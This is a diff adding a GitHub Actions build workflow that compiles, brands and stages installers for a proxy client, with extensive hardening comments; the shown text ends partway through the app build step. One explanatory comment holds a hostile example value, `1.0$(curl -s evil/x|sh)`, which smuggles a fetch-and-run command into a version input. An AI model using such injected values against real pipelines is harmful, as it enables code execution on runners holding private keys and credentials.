@@ -1,0 +1,1605 @@
+# =============================================================================
+# build.yml  —  lives in the PUBLIC repo:  codeman9528/QuasarAPP-build
+# Copy this file to that repo at  .github/workflows/build.yml
+#
+# One workflow, end to end: compile every selected platform, sign the Android
+# APK, collate the installer index, bundle it, hand it to R2, tell the console.
+#
+# Desktop needs no signing key at all — the client has no self-updater, so users
+# just download the installer from the link the operator publishes. The single
+# real key left is the Android release keystore (the OS refuses an upgrade signed
+# by a different key), and it lives here as a repo secret. This repo already
+# holds PRIVATE_REPO_DEPLOY_KEY, a strictly more valuable credential, so the
+# second (private) pipeline that used to exist purely to hold that keystore
+# bought no isolation while adding an R2 round-trip, a repository_dispatch and a
+# build-state machine that could drop a callback.
+#
+# Platform jobs stage into R2 under one $BUILD_ID/ prefix; `publish` fans them in.
+#
+# ── Single-workflow fan-in (ADR-013 + console targets) ───────────────────────
+# The console passes `targets` (windows,macos,linux,android,androidtv). A `setup`
+# job turns that into a desktop build matrix + an android flag; `compile` and
+# `android` run only for selected platforms; `handoff` waits for BOTH and
+# dispatches sign.yml EXACTLY ONCE. sign.yml pulls the whole $BUILD_ID/ staging
+# and signs whatever is there, so a mixed desktop+android build yields ONE
+# signed bundle with ONE merged installers.json — no manifest clobber, one
+# callback. (Previously android lived in a separate build-android.yml the
+# console never triggered, and two independent sign runs clobbered the manifest.)
+#
+# ⚠️ AUTHORED WITHOUT A FULL CI DRY RUN — expect iteration. Likely spots: the
+#    dynamic matrix (fromJSON), the android job's NDK/gomobile steps, and the
+#    handoff `if:` gating.
+#
+# THIS IS THE ONLY WORKFLOW THE FARM RUNS. The old build-android.yml "manual
+# escape hatch" is deleted: it re-introduced four things forbidden here (unpinned
+# `uses:` tags, `vars.*` for the R2 config, workflow-level env leaking brand slugs
+# and build ids into a PUBLIC repo's logs, and upload-artifact of the APK to that
+# public repo) and dispatched a sign.yml that no longer exists — so it could not
+# have worked anyway, while being copy-pasteable. scripts/check-workflow-drift.sh
+# asserts the farm repo has no build-android.yml.
+#
+# Every `uses:` is pinned to a commit SHA (the tag follows in a comment). A tag
+# is mutable: whoever can move `v4` can run their code on a runner that holds
+# the private-repo deploy key, the Android keystore and the R2 staging
+# credentials. Re-pin deliberately when upgrading — `scripts/pin-actions.sh`
+# resolves the current SHAs.
+# =============================================================================
+name: build
+
+on:
+  workflow_dispatch:
+    inputs:
+      slug:      { description: "brand slug (brands/<slug>/brand.yaml must exist in the private repo)", required: true }
+      version:   { description: "release version, e.g. 1.4.2", required: true }
+      build_id:  { description: "orchestrator build id (echoed back in the dispatch)", required: true }
+      notes:     { description: "更新内容 (release notes, shown in the client update dialog)", required: false, default: "" }
+      targets:   { description: "comma-separated platforms: windows,macos,linux,android,androidtv (blank = all)", required: false, default: "" }
+      # The console resolves the private repo's branch to a commit before it
+      # dispatches, so every job of a build compiles the SAME source. Without it
+      # each job checked out main HEAD independently: a push landing mid-build
+      # produced one "version" whose Windows and Android halves were different
+      # code, and a rebuild of a shipped version was not reproducible.
+      # Blank (an old dispatch, or a manual one) → the default branch, as before.
+      source_sha: { description: "private-repo commit to build (blank = default branch HEAD)", required: false, default: "" }
+
+concurrency:
+  group: build-${{ inputs.slug }}-${{ inputs.version }}
+  cancel-in-progress: false
+
+# Workflow inputs are exposed ONLY as environment variables and must be read as
+# "$SLUG" / "$VERSION" / … inside `run:` blocks. Never write ${{ inputs.* }}
+# directly in a script: GitHub substitutes the expression into the script text
+# BEFORE bash parses it, so a version like `1.0$(curl -s evil/x|sh)` executes on
+# a runner holding the private-repo deploy key and the R2 staging credentials —
+# from there an attacker can overwrite another tenant's unsigned artifacts before
+# sign.yml signs them. (The console also rejects such versions; this is the
+# second layer.) Passing them through `env:` keeps them as inert data.
+env:
+  # SLUG / VERSION / BUILD_ID / TARGETS / QUASAR_BUILD_ID are NOT set here. This
+  # repository is PUBLIC and Actions prints every step's env block: with them at
+  # workflow level, anyone could read the full customer list (brand slugs), each
+  # brand's release cadence and every build id straight off the Actions tab. The
+  # first step of every job ("Load inputs (masked)") reads them from the event
+  # payload, registers slug + build id as masks, THEN exports them — so every
+  # later env block and log line shows `***`.
+  # R2 staging endpoint + WRITE-ONLY-to-staging token (leak = throwaway bucket only).
+  # secrets, not vars: a var is printed in clear (account id + bucket name).
+  R2_ENDPOINT:           ${{ secrets.R2_ENDPOINT }}         # https://<acct>.r2.cloudflarestorage.com
+  AWS_ACCESS_KEY_ID:     ${{ secrets.R2_STAGING_KEY_ID }}
+  AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_STAGING_SECRET }}
+  AWS_DEFAULT_REGION:    auto
+  # rustc warnings quote source lines; in a public log that is private code.
+  RUSTFLAGS: -Awarnings
+  STAGING_BUCKET:        ${{ secrets.STAGING_BUCKET }}      # e.g. quasar-staging
+  # aws cli v2.23+ computes CRC checksums that Cloudflare R2 rejects (401).
+  # Force the legacy behaviour for EVERY aws call in this file.
+  AWS_REQUEST_CHECKSUM_CALCULATION:  when_required
+  AWS_RESPONSE_CHECKSUM_VALIDATION:  when_required
+
+jobs:
+  # ── Plan which platform jobs run, from the console's `targets` list ──────────
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      desktop_matrix: ${{ steps.plan.outputs.desktop_matrix }}
+      build_android:  ${{ steps.plan.outputs.build_android }}
+      # ONE timestamp for the whole run: every platform binary and the zip's
+      # 发布说明 show the same value.
+      build_time:     ${{ steps.plan.outputs.build_time }}
+    steps:
+      - name: Load inputs (masked)
+        shell: bash
+        run: |
+          set -euo pipefail
+          inp() { jq -r ".inputs.$1 // \"\"" "$GITHUB_EVENT_PATH"; }
+          slug="$(inp slug)"; bid="$(inp build_id)"
+          [ -n "$slug" ] && echo "::add-mask::$slug"
+          [ -n "$bid" ]  && echo "::add-mask::$bid" && echo "::add-mask::${bid:0:8}"
+          {
+            echo "SLUG=$slug"
+            echo "VERSION=$(inp version)"
+            echo "BUILD_ID=$bid"
+            echo "QUASAR_BUILD_ID=$bid"
+            echo "TARGETS=$(inp targets)"
+            echo "SOURCE_SHA=$(inp source_sha)"
+          } >> "$GITHUB_ENV"
+      - name: Plan jobs from targets
+        id: plan
+        shell: bash
+        run: |
+          set -euo pipefail
+          targets="$TARGETS"
+          [ -z "$targets" ] && targets="windows,macos,linux,android,androidtv"
+          matrix="[]"; android=false
+          IFS=',' read -ra T <<< "$targets"
+          for t in "${T[@]}"; do
+            t="$(echo "$t" | xargs)"   # trim whitespace
+            case "$t" in
+              windows) matrix=$(jq -c '. + [{"os":"windows-latest","arch":"windows-x86_64"}]' <<<"$matrix") ;;
+              macos)   matrix=$(jq -c '. + [{"os":"macos-14","arch":"darwin-universal"}]' <<<"$matrix") ;;  # universal = arm64 + x86_64 fat binary, one pkg for every Mac
+              # ubuntu-22.04, NOT ubuntu-latest: the runner's glibc becomes the
+              # binary's minimum, and `latest` moves under us (24.04 = glibc 2.39,
+              # which will not run on Ubuntu 22.04 LTS or Debian 12 — both still
+              # supported). packaging/linux/README promises glibc >= 2.31.
+              linux)   matrix=$(jq -c '. + [{"os":"ubuntu-22.04","arch":"linux-x86_64"}]' <<<"$matrix") ;;
+              android|androidtv) android=true ;;
+              *) echo "::warning::unknown target ignored: $t" ;;
+            esac
+          done
+          echo "desktop_matrix=$matrix" >> "$GITHUB_OUTPUT"
+          echo "build_android=$android" >> "$GITHUB_OUTPUT"
+          echo "build_time=$(TZ=Asia/Shanghai date '+%Y-%m-%d %H:%M') (UTC+8)" >> "$GITHUB_OUTPUT"
+          echo "· plan: desktop=$matrix  android=$android" | tee -a "$GITHUB_STEP_SUMMARY"
+
+  # ── Desktop compile (one job per selected desktop arch) ──────────────────────
+  compile:
+    needs: setup
+    if: ${{ needs.setup.outputs.desktop_matrix != '[]' }}
+    strategy:
+      # Partial success: one arch failing must NOT cancel the others — they still
+      # build + stage, and handoff publishes whatever succeeded.
+      fail-fast: false
+      matrix:
+        include: ${{ fromJSON(needs.setup.outputs.desktop_matrix) }}
+    runs-on: ${{ matrix.os }}
+    env:
+      QUASAR_BUILD_TIME: ${{ needs.setup.outputs.build_time }}
+    steps:
+      - name: Load inputs (masked)
+        shell: bash
+        run: |
+          set -euo pipefail
+          inp() { jq -r ".inputs.$1 // \"\"" "$GITHUB_EVENT_PATH"; }
+          slug="$(inp slug)"; bid="$(inp build_id)"
+          [ -n "$slug" ] && echo "::add-mask::$slug"
+          [ -n "$bid" ]  && echo "::add-mask::$bid" && echo "::add-mask::${bid:0:8}"
+          {
+            echo "SLUG=$slug"
+            echo "VERSION=$(inp version)"
+            echo "BUILD_ID=$bid"
+            echo "QUASAR_BUILD_ID=$bid"
+            echo "TARGETS=$(inp targets)"
+            echo "SOURCE_SHA=$(inp source_sha)"
+          } >> "$GITHUB_ENV"
+      - name: Checkout PRIVATE source (read-only deploy key)
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          repository: codeman9528/QuasarAPP
+          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}
+          # Empty → default branch (checkout's own fallback), so a manual
+          # dispatch without source_sha behaves exactly as it used to.
+          ref: ${{ env.SOURCE_SHA }}
+
+      # Builds float to main HEAD (no per-build ref pin), so record the exact
+      # commit that produced this artifact — provenance + reproducibility.
+      - name: Mask brand identity in logs
+        shell: bash
+        run: |
+          set -euo pipefail
+          f="brands/$SLUG/brand.yaml"
+          [ -f "$f" ] || exit 0
+          # name / identifier / window_title / the brand's own hosts: all of it
+          # identifies the customer, and builder + tauri print them.
+          grep -E '^[[:space:]]*(name|identifier|window_title|panel_base|update_base_url|public_url_base):' "$f" \
+            | sed -E 's/^[^:]*:[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/' \
+            | while IFS= read -r v; do
+                [ ${#v} -ge 2 ] && echo "::add-mask::$v"
+                host="$(printf '%s' "$v" | sed -nE 's#^https?://([^/:]+).*#\1#p')"
+                [ -n "$host" ] && echo "::add-mask::$host"
+              done || true
+      - name: Record source commit
+        id: src
+        shell: bash
+        run: |
+          set -euo pipefail
+          sha="$(git rev-parse HEAD)"
+          echo "sha=$sha" >> "$GITHUB_OUTPUT"
+          echo "· built v$VERSION ${{ matrix.arch }} from private@${sha:0:9}" \
+            | tee -a "$GITHUB_STEP_SUMMARY"
+
+      - name: Linux build deps
+        if: startsWith(matrix.os, 'ubuntu-')
+        run: |
+          sudo apt-get update
+          # `rpm` provides rpmbuild — without it Tauri silently skips the .rpm
+          # bundle. dpkg-dev backs the .deb. (webkit2gtk etc. for the app itself.)
+          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev \
+            librsvg2-dev patchelf build-essential file rpm dpkg-dev
+
+      # Must match rust-toolchain.toml. rustup honours that file over whatever
+      # this action installs, so a lower pin here silently builds with the
+      # newer toolchain — and any `targets:` added below would land on the
+      # wrong one (Android std missing → "can't find crate for `std`").
+      - uses: dtolnay/rust-toolchain@688313b0823df1393bcebb1b4add0438a6d36884 # 1.88.0
+      # prefix-key is the kill switch for the cache itself. A cache entry is
+      # restored into `target/` before anything here is built, by key alone —
+      # whoever could write one (a compromised action, a poisoned crate's build
+      # script, an earlier bad run) gets their object linked into every later
+      # build of the same Cargo.lock. There was no way to repudiate that except
+      # editing Cargo.lock. Bumping this ONE string (all three jobs share it)
+      # orphans every existing entry. Bump it after any incident, or when a
+      # cached artifact is suspect.
+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
+        with: { prefix-key: "v1-quasar-farm" }
+      # No version here — pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4 errors if a version is set both
+      # here AND via package.json's packageManager (pnpm@9.12.0). Let it read that.
+      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with: { node-version: 20, cache: pnpm }
+
+      - name: Install Tauri CLI
+        # Exact pin, same minor as the `tauri` crate in Cargo.lock (2.11.x). "^2.1"
+        # let cargo pick the newest 2.x: tauri-cli 2.12.0 (2026-09-26) needs rustc
+        # 1.90 while this job pins 1.88, which broke every platform at install.
+        run: cargo install tauri-cli --version "=2.11.5" --locked
+
+      - name: Build UI bundle
+        run: |
+          pnpm install --frozen-lockfile
+          pnpm -C apps/ui build
+
+      # shell: bash is LOAD-BEARING. Without it this step runs under PowerShell on
+      # windows-latest, where `$SLUG` is an undefined PowerShell variable (env vars
+      # are `$env:SLUG`) — it expands to empty and the path becomes
+      # `brands//brand.yaml`. POSIX collapses the double slash so linux/macos never
+      # noticed; Windows does not, so every Windows build failed here with
+      # "The system cannot find the file specified" and the release shipped with no
+      # Windows package at all. Every neighbouring step already sets it.
+      - name: Apply brand (patches tauri.conf.json + icons + .cargo env)
+        shell: bash
+        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"
+
+      # Gate on the EMITTED value, not on brand.yaml.
+      #
+      # quasar-builder itself now refuses an empty `client.endpoint_allowlist`
+      # (that list is the only thing stopping a forged config from redirecting
+      # logins — SECURITY.md §4). But this workflow can be dispatched with an
+      # arbitrary `source_sha`, and an older quasar-builder silently IGNORES
+      # brand.yaml keys it does not know (main.rs says so in as many words). So
+      # the only check that cannot be bypassed by building an old ref is on what
+      # actually reached the compiler: the [env] block in .cargo/config.toml,
+      # which is where the client's `option_env!("QUASAR_ENDPOINT_ALLOWLIST")`
+      # reads from. No value → the client accepts any panel host a config names.
+      - name: Verify the endpoint allowlist was baked in
+        shell: bash
+        run: |
+          set -euo pipefail
+          v="$(sed -n 's/^[[:space:]]*QUASAR_ENDPOINT_ALLOWLIST[[:space:]]*=[^"]*"\([^"]*\)".*/\1/p' \
+            .cargo/config.toml | head -1)"
+          # Count entries the way the CLIENT parses them (config.rs endpoint_allowlist:
+          # split on ',', trim, strip leading dots, drop empties) — not raw text.
+          # "." or "," is non-blank yet yields an empty list at runtime, which is
+          # the unrestricted client this gate exists to stop. quasar-builder's
+          # client_allowlist() applies the same rule before we ever get here.
+          n="$(printf '%s' "$v" | tr ',' '\n' \
+            | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/^\.*//' \
+            | grep -c . || true)"
+          if [ "${n:-0}" -eq 0 ]; then
+            echo "::error::QUASAR_ENDPOINT_ALLOWLIST has no usable domain (raw: '$v') — this client would post credentials to ANY host its remote config names. Re-save the brand in the console so brand.yaml carries client.endpoint_allowlist."
+            exit 1
+          fi
+          echo "endpoint allowlist: $n domain(s)"
+
+      # One normalized logo → every platform's assets. This used to be a bare
+      # `cargo tauri icon brands/$SLUG/icon.png`, which scales the upload FULL-BLEED
+      # into every size: measured results were a 32×32 tray icon whose content was
+      # 8×8, a full-bleed .icns that sits in the Dock as an oversized sticker, and an
+      # Android launcher icon cropped by a third. quasar-builder trims/pads/scales
+      # once, picks a background the logo actually contrasts against, then renders
+      # each platform's real framing — and shells out to `cargo tauri icon` itself
+      # for the .ico/.icns encoding, so the tauri CLI is still required here.
+      # No brand icon.png → it prints that and leaves the repo defaults alone.
+      - name: Brand icons + splash (normalize → every platform)
+        shell: bash
+        run: cargo run -p quasar-builder -- icons --brand "brands/$SLUG/brand.yaml"
+
+      # ── Proxy kernel (sing-box | mihomo | mihomo-smart) ─────────────────────
+      # ONE kernel per brand build. quasar-builder validated brand.yaml's
+      # `client.kernel`, swapped the cargo feature and baked QUASAR_KERNEL into
+      # .cargo/config.toml; read it back from THERE (the value that reached the
+      # compiler — same reasoning as the allowlist gate) and export it for the
+      # fetch/build steps below.
+      #
+      # Old `source_sha` tolerance: a builder that predates `client.kernel`
+      # writes no QUASAR_KERNEL → sing-box, which is all that source can build.
+      # But if brand.yaml ASKS for mihomo and the builder did not apply it, that
+      # is a brand silently shipping the wrong kernel: fail instead.
+      - name: Resolve proxy kernel
+        id: kernel
+        shell: bash
+        run: |
+          set -euo pipefail
+          k=""
+          if [ -f .cargo/config.toml ]; then
+            k="$(sed -n 's/^[[:space:]]*QUASAR_KERNEL[[:space:]]*=[^"]*"\([^"]*\)".*/\1/p' \
+              .cargo/config.toml | head -1)"
+          fi
+          want=""
+          f="brands/$SLUG/brand.yaml"
+          if [ -n "$SLUG" ] && [ -f "$f" ]; then
+            want="$(sed -nE 's/^[[:space:]]+kernel:[[:space:]]*"?([A-Za-z0-9_-]*)"?[[:space:]]*(#.*)?$/\1/p' "$f" | head -1)"
+          fi
+          [ -n "$k" ] || k="sing-box"
+          if [ -n "$want" ] && [ "$want" != "$k" ]; then
+            echo "::error::brand.yaml asks for kernel '$want' but the applied build is '$k' — this source_sha's quasar-builder does not support client.kernel. Build a newer source, or set the brand back to sing-box."
+            exit 1
+          fi
+          case "$k" in
+            sing-box)     feat=kernel-singbox ;;
+            mihomo)       feat=kernel-mihomo ;;
+            mihomo-smart) feat=kernel-mihomo-smart ;;
+            *) echo "::error::unknown QUASAR_KERNEL '$k'"; exit 1 ;;
+          esac
+          # Only for mihomo: a sing-box build of an old source_sha keeps whatever
+          # default list that source had.
+          if [ "$k" != "sing-box" ] && ! grep -E '^default[[:space:]]*=' crates/tauri-app/Cargo.toml | grep -q "\"$feat\""; then
+            echo "::error::crates/tauri-app/Cargo.toml default features do not select $feat"; exit 1
+          fi
+          echo "QUASAR_KERNEL=$k" >> "$GITHUB_ENV"
+          echo "kernel=$k" >> "$GITHUB_OUTPUT"
+          echo "· proxy kernel: $k ($feat)"
+
+      # mihomo / mihomo-smart are COMPILED from a pinned commit here (they run as
+      # root on users' machines; the smart fork has no stable release to pin a
+      # checksum to) — see kernels/mihomo/SOURCE. Go must be EXACTLY the pin's
+      # GO_VERSION (1.26.8: past the 1.26.5 / 1.26.6 security releases);
+      # build-bin.sh refuses anything else. Keep this in step with both SOURCE
+      # files. sing-box builds skip all of this.
+      #
+      # cache: false — setup-go's built-in cache would also restore GOCACHE
+      # (compiled objects), which nothing re-verifies. Only the MODULE cache is
+      # restored below, and build-bin.sh runs `go mod verify` against the pinned
+      # go.sum before compiling, so a poisoned entry fails the build instead of
+      # landing in a root binary.
+      - name: Set up Go (mihomo kernels)
+        if: steps.kernel.outputs.kernel != 'sing-box'
+        uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
+        with: { go-version: "1.26.8", cache: false }
+
+      # Keyed on the exact pin file, no restore-keys (never a "close enough"
+      # entry from another pin). `v1-quasar-farm` is the same kill switch as the
+      # rust-cache prefix-key — bump them together.
+      - name: Cache Go modules (mihomo kernels)
+        if: steps.kernel.outputs.kernel != 'sing-box'
+        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4
+        with:
+          path: ~/go/pkg/mod
+          key: v1-quasar-farm-gomod-${{ runner.os }}-${{ steps.kernel.outputs.kernel }}-${{ hashFiles('kernels/mihomo/SOURCE', 'kernels/mihomo-smart/SOURCE', 'kernels/mihomo/cmd/mihomo/go.mod') }}
+
+      # QUASAR_KERNEL (from $GITHUB_ENV) picks the geo format: .srs for sing-box,
+      # .mrs for mihomo/mihomo-smart. An older fetch-geo.sh ignores it → .srs,
+      # which is what that source's sing-box-only client reads.
+      - name: Fetch geo databases (bundled so the client loads geoip locally,
+              not from GitHub at runtime — blocked behind the GFW; ADR-014 §6)
+        shell: bash
+        run: bash scripts/fetch-geo.sh crates/tauri-app/resources/geo
+
+      # QUASAR_KERNEL (from $GITHUB_ENV): sing-box → pinned release download;
+      # mihomo/mihomo-smart → compiled from the pinned commit (+ the sha-pinned
+      # LightGBM Model.bin for smart). xray is fetched for every kernel.
+      - name: Fetch / build kernel binaries (bundled so a fresh install works
+              offline — no first-run download)
+        shell: bash
+        env:
+          # Universal macOS → lipo-merge both darwin arches of the kernel + xray
+          # into fat binaries so the one universal .app runs on Apple Silicon AND Intel.
+          MACOS_UNIVERSAL: ${{ matrix.arch == 'darwin-universal' && '1' || '0' }}
+        run: bash scripts/fetch-kernels.sh crates/tauri-app/resources/kernels
+
+      # ── Sentry symbols: step 1/3 — gate + pinned sentry-cli ─────────────────
+      # Release binaries ship stripped and the UI ships minified, so without the
+      # debug files / source maps a crash report is a column of bare addresses.
+      # Everything Sentry needs is produced and uploaded ONLY when the
+      # SENTRY_AUTH_TOKEN secret exists (secrets cannot appear in `if:`, so this
+      # step turns its presence into an output). No secret → a notice, and the
+      # build is byte-for-byte what it was before. An older source_sha without
+      # the scripts → same. The token lives ONLY in the env: of this step and
+      # the upload step — never in the build steps, where every dependency's
+      # build script runs — and is never interpolated into `run:` text (same
+      # rule as the HMAC secret below). Org / project default inside
+      # scripts/sentry-upload.sh (private repo), not here.
+      #
+      # sentry-cli is a release binary pinned by version + sha256, the same
+      # contract as a SHA-pinned `uses:` (the header). Re-pin deliberately:
+      # the digests are on the GitHub release page (asset "digest" field).
+      #
+      # Runs BEFORE the helper is built: the helper gets the same separate
+      # debug info as the app, so its panics symbolicate too.
+      - name: Sentry symbols — gate + install pinned sentry-cli
+        id: sentry
+        shell: bash
+        env:
+          SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
+        run: |
+          set -euo pipefail
+          off() { echo "::notice::$1"; echo "enabled=false" >> "$GITHUB_OUTPUT"; exit 0; }
+          [ -n "${SENTRY_AUTH_TOKEN:-}" ] || off "SENTRY_AUTH_TOKEN not set — no debug files / source maps are built or uploaded"
+          [ -f scripts/sentry-upload.sh ] && [ -f scripts/split-debug.sh ] \
+            || off "this source predates Sentry symbol upload — skipped"
+          v=3.8.0
+          case "$RUNNER_OS-$RUNNER_ARCH" in
+            Linux-X64)   f=sentry-cli-Linux-x86_64;        sum=13f8cb34ae01a6a272d7d7c22e277a105286615b4020de900ea95a8de47cdbb6 ;;
+            macOS-ARM64) f=sentry-cli-Darwin-arm64;        sum=1dda212b0e168b9c4dc48d7d3aa24c1c37de9c6edf786e6ae661236e529969cd ;;
+            macOS-X64)   f=sentry-cli-Darwin-x86_64;       sum=279c795b15de7a76106d30b6611b7942b1a97323307327bafc18335f10384c4d ;;
+            Windows-X64) f=sentry-cli-Windows-x86_64.exe;  sum=2257cf6805a616f5c3ee291a549ebbba021190048b646adc006beb4e8cdef7fd ;;
+            *) off "no pinned sentry-cli for $RUNNER_OS-$RUNNER_ARCH — skipped" ;;
+          esac
+          # Subdirectories of RUNNER_TEMP (checkout leaves the deploy key in its
+          # top level), outside the workspace. Forward slashes on Windows so
+          # node + bash agree on them. `sentry/` receives what the build
+          # produces (debug files, UI maps); `sentry-tools/` holds the two
+          # things that later run WITH the token — sentry-cli and a copy of
+          # scripts/sentry-upload.sh — whose sha256 go into this step's OUTPUTS
+          # (which no later step can rewrite, unlike GITHUB_ENV / RUNNER_TEMP):
+          # the upload step re-checks both before it runs anything.
+          dir="$RUNNER_TEMP/sentry"; tools="$RUNNER_TEMP/sentry-tools"
+          if [ "$RUNNER_OS" = Windows ]; then dir="$(cygpath -m "$dir")"; tools="$(cygpath -m "$tools")"; fi
+          rm -rf "$dir" "$tools"; mkdir -p "$dir/debug" "$tools"
+          exe="$tools/sentry-cli"; [ "$RUNNER_OS" = Windows ] && exe="$exe.exe"
+          # Network trouble is not a reason to fail a release: no symbols this
+          # time, said out loud. A checksum MISMATCH is — see below.
+          curl -fsSL --retry 3 --retry-all-errors --connect-timeout 20 --max-time 300 \
+               -o "$exe" "https://github.com/getsentry/sentry-cli/releases/download/$v/$f" \
+            || off "sentry-cli $v download failed (network) — this build uploads no debug files / source maps"
+          sha() { (sha256sum "$1" 2>/dev/null || shasum -a 256 "$1") | awk '{print $1}'; }
+          got="$(sha "$exe")"
+          [ "$got" = "$sum" ] || { echo "::error::sentry-cli $v checksum mismatch ($got)"; exit 1; }
+          chmod +x "$exe"
+          "$exe" --version
+          cp scripts/sentry-upload.sh "$tools/sentry-upload.sh"
+          {
+            echo "tools=$tools"
+            echo "cli_sha256=$got"
+            echo "upload_sha256=$(sha "$tools/sentry-upload.sh")"
+            echo "debug_dir=$dir/debug"
+            echo "ui_maps_dir=$dir/ui"
+          } >> "$GITHUB_OUTPUT"
+          {
+            # apps/ui/vite.config.ts: hidden maps, debug-id inject, moved out of dist/ to here.
+            echo "QUASAR_UI_SOURCEMAPS_DIR=$dir/ui"
+            echo "QUASAR_DEBUG_FILES_DIR=$dir/debug"
+          } >> "$GITHUB_ENV"
+          echo "enabled=true" >> "$GITHUB_OUTPUT"
+
+      # The desktop TUN root helper (binary + macOS launchd plist) is bundled into
+      # the app's Resources/helper (all 3 desktop confs list "resources/helper").
+      # Both are gitignored, so CI must stage them or TUN install fails with
+      # "helper binary not found" / "launchd plist not found". stage-helper.sh
+      # builds the binary AND generates the plist with the brand slug substituted
+      # into the launchd Label / socket path (must run AFTER the brand patch so
+      # the plist's io.<slug>.helper matches the client's brand-aware socket).
+      #
+      # This step deliberately exports NO QUASAR_APP_SLUG. It used to pass
+      # `inputs.slug` — the brand DIRECTORY name — while the helper is compiled
+      # with brand.yaml's `slug:` (cargo's `[env] … force = true` wins over the
+      # environment). When the two differ, the plist's Label and the socket the
+      # binary listens on differ, and TUN silently never connects. stage-helper.sh
+      # now reads the slug out of .cargo/config.toml, i.e. the same single source
+      # the compiler uses.
+      #
+      # With the Sentry gate open the helper gets the app's recipe (see "Build
+      # app"): line tables, split off — dSYM per arch on macOS, PDB on Windows,
+      # and on Linux split-debug.sh strips the STAGED binary (the one bundled)
+      # into $QUASAR_DEBUG_FILES_DIR/quasar-helper.debug.
+      - name: Build + stage TUN root helper (binary + brand plist)
+        shell: bash
+        env:
+          SENTRY_SYMBOLS: ${{ steps.sentry.outputs.enabled }}
+        run: |
+          set -euo pipefail
+          if [ "$SENTRY_SYMBOLS" = "true" ]; then
+            export CARGO_PROFILE_RELEASE_DEBUG=line-tables-only
+            case "${{ matrix.arch }}" in
+              darwin-*)
+                export CARGO_PROFILE_RELEASE_SPLIT_DEBUGINFO=packed ;;
+              windows-*)
+                export CARGO_PROFILE_RELEASE_STRIP=none ;;
+              linux-*)
+                export CARGO_PROFILE_RELEASE_STRIP=none
+                export RUSTFLAGS="${RUSTFLAGS:-} -C link-arg=-Wl,--build-id=sha1" ;;
+            esac
+          fi
+          # Universal macOS → build the helper as a fat arm64+x86_64 binary too,
+          # else TUN breaks on Intel (see stage-helper.sh). Other arches: host build.
+          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
+            bash scripts/stage-helper.sh universal-apple-darwin
+          else
+            bash scripts/stage-helper.sh
+          fi
+          case "$SENTRY_SYMBOLS/${{ matrix.arch }}" in
+            true/linux-*)
+              bash scripts/split-debug.sh linux crates/tauri-app/resources/helper/quasar-helper "$QUASAR_DEBUG_FILES_DIR" ;;
+          esac
+
+      # macOS ships a UNIVERSAL binary (arm64 + x86_64) so one .pkg installs on
+      # every Mac. universal-apple-darwin needs BOTH rust std targets present.
+      - name: Add macOS universal rust targets
+        if: matrix.arch == 'darwin-universal'
+        run: rustup target add aarch64-apple-darwin x86_64-apple-darwin
+
+      # Swatinem/rust-cache keys on the job + Cargo.lock, NOT on the brand, so
+      # `target/` is shared across every brand this farm builds — and bundle
+      # output survives in it. The macOS collect step then globs
+      # `bundle/macos/*.app` and takes the first hit, which sorts by BYTES: an
+      # ASCII name like `SeaGullFast.app` comes before a Chinese one like
+      # `赢速网络.app`. So a build could pick up the PREVIOUS brand's app.
+      # Observed as a pkgbuild "not a valid bundle component" failure, but the
+      # dangerous case is the quiet one — a complete stale app would have been
+      # signed and shipped as this brand's release.
+      - name: Purge stale bundle output from earlier brands
+        shell: bash
+        run: rm -rf target/*/release/bundle target/release/bundle
+
+      # ── Sentry symbols: step 2/3 — build with SEPARATE debug info ───────────
+      # Only with the gate above open. Line tables (enough for file:line on every
+      # frame, a fraction of full debuginfo), split off so the shipped binaries
+      # are as stripped as before:
+      #   macOS   split-debuginfo=packed → rustc runs dsymutil BEFORE its strip:
+      #           <target>/release/quasar-app.dSYM per arch (tauri lipos the two
+      #           stripped slices; each keeps its UUID, each dSYM is uploaded).
+      #   Windows the PDB is always separate on MSVC, but strip=true means
+      #           /DEBUG:NONE (no PDB at all) → STRIP=none. The exe gains only a
+      #           CodeView record naming the PDB (rustc passes /PDBALTPATH:%_PDB%,
+      #           so no build path).
+      #   Linux   STRIP=none, then scripts/split-debug.sh as tauri's
+      #           beforeBundleCommand (--config, farm only) moves the DWARF into
+      #           $QUASAR_DEBUG_FILES_DIR and strips the binary BEFORE deb/rpm/
+      #           AppImage are made. --build-id: the key Sentry matches the .debug
+      #           by (without one the split file is unusable).
+      # RUSTFLAGS is extended, not replaced: it overrides every other rustflags
+      # source, and the workflow-level -Awarnings must stay.
+      - name: Build app (installers)
+        shell: bash
+        env:
+          SENTRY_SYMBOLS: ${{ steps.sentry.outputs.enabled }}
+        run: |
+          set -euo pipefail
+          conf=""
+          if [ "$SENTRY_SYMBOLS" = "true" ]; then
+            export CARGO_PROFILE_RELEASE_DEBUG=line-tables-only
+            case "${{ matrix.arch }}" in
+              darwin-*)
+                export CARGO_PROFILE_RELEASE_SPLIT_DEBUGINFO=packed ;;
+              windows-*)
+                export CARGO_PROFILE_RELEASE_STRIP=none ;;
+              linux-*)
+                export CARGO_PROFILE_RELEASE_STRIP=none
+                export RUSTFLAGS="${RUSTFLAGS:-} -C link-arg=-Wl,--build-id=sha1"
+                conf="$QUASAR_DEBUG_FILES_DIR/../tauri-split-debug.json"
+                SPLIT_CMD="bash $GITHUB_WORKSPACE/scripts/split-debug.sh linux $GITHUB_WORKSPACE/target/release/quasar-app $QUASAR_DEBUG_FILES_DIR" \
+                  python3 -c 'import json,os,sys; json.dump({"build":{"beforeBundleCommand":os.environ["SPLIT_CMD"]}}, open(sys.argv[1],"w"))' "$conf"
+                ;;
